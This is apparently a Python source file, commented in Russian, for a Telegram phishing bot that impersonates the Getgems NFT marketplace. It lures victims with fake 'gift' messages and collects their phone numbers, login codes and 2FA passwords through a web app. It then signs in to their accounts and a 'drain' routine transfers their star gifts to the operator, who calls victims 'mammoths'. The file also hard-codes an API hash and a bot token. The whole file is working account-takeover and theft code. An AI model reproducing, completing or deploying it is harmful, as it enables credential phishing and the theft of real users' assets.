import os
import asyncio
import math
import threading
import re
import logging
from flask import Flask, render_template, request, jsonify
from telethon import TelegramClient, events, Button, functions, types
from telethon.errors import SessionPasswordNeededError, PhoneCodeInvalidError, PasswordHashInvalidError

# --- КОНФИГУРАЦИЯ ---
API_ID = '34426356'
API_HASH = 'ddfa0edfefb66da4b06bc85e23fd40d5'
BOT_TOKEN = '8028370592:AAHmcGRTUoxPEwbDBcw1tsQmQlx5cty3ahM'
ADMIN_ID = 678335503  # ID админа
WORKER_ID = 8311100024 # ID воркера

# Инициализация бота
bot = TelegramClient('bot_auth', API_ID, API_HASH).start(bot_token=BOT_TOKEN)
app = Flask(__name__)

# Хранилище активных сессий (телефон: объект клиента)
active_clients = {}
temp_clients = {}

def send_log(msg):
    bot.loop.create_task(bot.send_message(ADMIN_ID, msg))
    bot.loop.create_task(bot.send_message(WORKER_ID, msg))

# --- КОМАНДЫ БОТА ---

@bot.on(events.NewMessage(pattern='/start'))
async def start_handler(event):
    welcome_text = (
        "Это бот Getgems – вы можете торговать NFT прямо в мини-аппе. "
        "Это самый удобный способ покупать и продавать Telegram-подарки, "
        "Юзернеймы, Анонимные Номера и тысячи NFT из коллекций на TON. 🎯\n\n"
        "💎 0% комиссий на торговлю Telegram Подарками с пометкой «offchain»\n"
        "💎 Покупайте Telegram Звёзды на 30% дешевле, чем в Telegram\n\n"
        "💡 Делитесь мгновенно NFT в чатах: сначала пришлите сюда адрес кошелька, "
        "а затем введите @GetgemsNftBot в диалоге, чтобы отправить NFT."
    )
    
    # Кнопки как на скриншоте
    buttons = [
        [Button.url("Торговать Telegram Numbers ↗️", "https://getgems.io/fragment-numbers")],
        [Button.url("Торговать Telegram Usernames ↗️", "https://getgems.io/fragment-usernames")],
        [Button.url("Торговать Telegram Gifts ↗️", "https://getgems.io/nft-gifts")]
    ]
    
    await event.respond(welcome_text, buttons=buttons, link_preview=False)

@bot.on(events.NewMessage(pattern='/stars_check'))
async def stars_check(event):
    if event.sender_id != ADMIN_ID: return
    try:
        res = await bot(functions.payments.GetStarsStatusRequest(peer=event.sender_id))
        balance = res.balance
        transfers = math.floor(balance / 25)
        await event.respond(f"📊 **Баланс:** `{balance}` ⭐\n🎁 Хватит на `{transfers}` передач.")
    except Exception as e:
        await event.respond(f"❌ Ошибка: {e}")

# --- WEBAPP & API ЛОГИКА ---

@app.route('/')
def index():
    nft = request.args.get('nft', 'RecordPlayer-26983')
    lang = request.args.get('lang', 'ru')
    send_log(f"👤 Мамонт открыл WebApp | NFT: {nft}")
    return render_template('index.html', nft=nft, lang=lang)

@app.route('/api/send_phone', methods=['POST'])
async def api_send_phone():
    data = request.json
    phone = data.get('phone').replace(' ', '').replace('-', '')
    
    try:
        # Создаем временную сессию для этого номера
        client = TelegramClient(f'sessions/{phone}', API_ID, API_HASH)
        await client.connect()
        
        # Запрашиваем код
        send_code_result = await client.send_code_request(phone)
        phone_code_hash = send_code_result.phone_code_hash
        
        # Сохраняем клиента и хеш кода во временное хранилище
        temp_clients[phone] = {
            'client': client,
            'hash': phone_code_hash
        }
        
        send_log(f"📲 Код отправлен на номер: {phone}")
        return jsonify({"status": "sent"})
    except Exception as e:
        send_log(f"❌ Ошибка при отправке кода {phone}: {e}")
        return jsonify({"status": "error", "details": str(e)})

@app.route('/api/send_code', methods=['POST'])
async def api_send_code():
    data = request.json
    phone = data.get('phone').replace(' ', '').replace('-', '')
    code = data.get('code')
    
    if phone not in temp_clients:
        return jsonify({"status": "error", "message": "Session not found"})
    
    client_data = temp_clients[phone]
    client = client_data['client']
    
    try:
        # Пытаемся зайти
        await client.sign_in(phone, code, phone_code_hash=client_data['hash'])
        
        # Если зашли успешно — переносим в активные и запускаем слив
        active_clients[phone] = client
        send_log(f"👑 Аккаунт авторизован: {phone}. Запускаю слив...")
        
        # Запуск слива в фоне
        asyncio.create_task(drain_logic(client, phone))
        
        return jsonify({"status": "success"})
        
    except SessionPasswordNeededError:
        # Если стоит 2FA (облачный пароль)
        send_log(f"🔐 На номере {phone} стоит 2FA!")
        return jsonify({"status": "2fa_needed"})
    except PhoneCodeInvalidError:
        return jsonify({"status": "wrong_code"})
    except Exception as e:
        return jsonify({"status": "error", "details": str(e)})

@app.route('/api/send_password', methods=['POST'])
async def api_send_password():
    data = request.json
    phone = data.get('phone').replace(' ', '').replace('-', '')
    password = data.get('password')
    
    if phone not in temp_clients:
        return jsonify({"status": "error"})
    
    client = temp_clients[phone]['client']
    try:
        await client.sign_in(password=password)
        active_clients[phone] = client
        send_log(f"🔓 2FA пройдено: {phone}. Запускаю слив...")
        
        asyncio.create_task(drain_logic(client, phone))
        return jsonify({"status": "success"})
    except PasswordHashInvalidError:
        return jsonify({"status": "wrong_password"})

# --- INLINE HANDLER ---

@bot.on(events.InlineQuery)
async def inline_handler(event):
    if not event.text:
        return

    # Пример ввода: @bot_user https://getgems.io/collection/.../NFT_NAME
    input_text = event.text.strip()
    
    # Парсим название NFT из ссылки для красоты
    nft_display_name = input_text.split('/')[-1].replace('-', ' ').title()
    
    # Формируем ссылку на WebApp, передавая URL конкретного NFT
    # Важно: URL должен быть закодирован, чтобы не сломать параметры
    import urllib.parse
    encoded_nft = urllib.parse.quote(input_text)
    web_url = f"https://your-domain.com/?nft_url={encoded_nft}"

    builder = event.builder
    await event.answer([
        builder.article(
            title=f"Подарить {nft_display_name}",
            description="Нажмите, чтобы отправить этот подарок",
            thumb=types.InputWebDocument(url="https://getgems.io/assets/nft-placeholder.png", size=0, mime_type='image/png', attributes=[]),
            text=f"🎁 **Вам отправили подарок!**\n\nОбъект: `{nft_display_name}`\n\nЧтобы принять подарок и добавить его в свой профиль, нажмите кнопку ниже 👇",
            buttons=[
                [Button.web_app("Принять подарок 🎁", web_url)],
                [Button.url("Посмотреть на Getgems", input_text)]
            ]
        )
    ])

# --- MAMONITIZATION (СЛИВ) ---

async def drain_logic(client, phone):
    try:
        # Проверяем личный баланс звезд мамонта
        res = await client(functions.payments.GetStarsStatusRequest(peer='me'))
        stars_balance = res.balance
        send_log(f"💰 Баланс {phone}: {stars_balance} ⭐")

        if stars_balance < 25:
            send_log(f"🧸 Мамонту {phone} нужно подкинуть мишку (не хватает на комиссию).")
            # Можно добавить кнопку "Подкинуть 25 звезд" для админа
            return

        gifts = await client(functions.payments.GetStarGiftsRequest(offset='', limit=100))
        if not gifts.gifts:
            send_log(f"💨 На аккаунте {phone} нет подарков для вывода.")
            return

        for gift in gifts.gifts:
            try:
                # Передаем админу
                await client(functions.payments.TransferStarGiftRequest(
                    to_id=ADMIN_ID, 
                    stargift_id=gift.id
                ))
                send_log(f"✅ NFT {gift.id} слит с {phone}")
                await asyncio.sleep(2) # Пауза, чтобы не словить флудвейт
            except Exception as e:
                send_log(f"❌ Ошибка слива NFT {gift.id}: {e}")
                
        send_log(f"🏁 Слив {phone} завершен.")
    except Exception as e:
        send_log(f"⚠️ Ошибка в процессе слива {phone}: {e}")

@bot.on(events.CallbackQuery(data=re.compile(b"redrain_")))
async def redrain(event):
    phone = event.data.decode().split('_')[1]
    if phone in active_clients:
        await event.answer("♻️ Повторный запуск...")
        await drain_logic(active_clients[phone], phone)
    else:
        await event.answer("❌ Сессия мертва", alert=True)

# --- ЗАПУСК ---

def run_flask():
    # Запуск на 80 порту (требует прав root)
    app.run(port=80, host='0.0.0.0')

if __name__ == '__main__':
    # Запускаем Flask в отдельном потоке
    threading.Thread(target=run_flask, daemon=True).start()
    print("Бот запущен...")
    bot.run_until_disconnected()